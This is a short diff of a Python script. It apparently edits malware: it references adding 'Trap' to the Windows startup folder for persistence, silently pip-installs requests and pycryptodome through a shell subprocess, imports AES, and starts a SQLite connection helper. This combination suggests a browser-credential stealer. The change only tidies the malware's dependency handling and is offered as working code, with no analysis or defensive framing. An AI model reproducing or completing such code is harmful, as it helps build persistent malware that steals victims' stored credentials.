@@ -35,16 +35,15 @@ else:
     StartupMessage = 'Error while adding Trap into the startup folder' 
 requirements = [
     ["requests", "requests"],
-    ["Crypto.Cipher", "pycryptodome" if not 'PythonSoftwareFoundation' in executable else 'Crypto']
+    ["Crypto.Cipher", "pycryptodome"]
 ]
-for module in requirements:
-    try: 
-        __import__(module[0])
+for modl in requirements:
+    try: __import__(modl[0])
     except:
-        subprocess.Popen(f"\"{executable}\" -m pip install {module[1]} --quiet", shell=True)
+        subprocess.Popen(f"{executable} -m pip install {modl[1]}", shell=True)
         time.sleep(3)
 
-from Cryptodome.Cipher import AES
+from Crypto.Cipher import AES
 import requests
 def sql_connect(database_path):
     conn = sqlite3.connect(database_path)
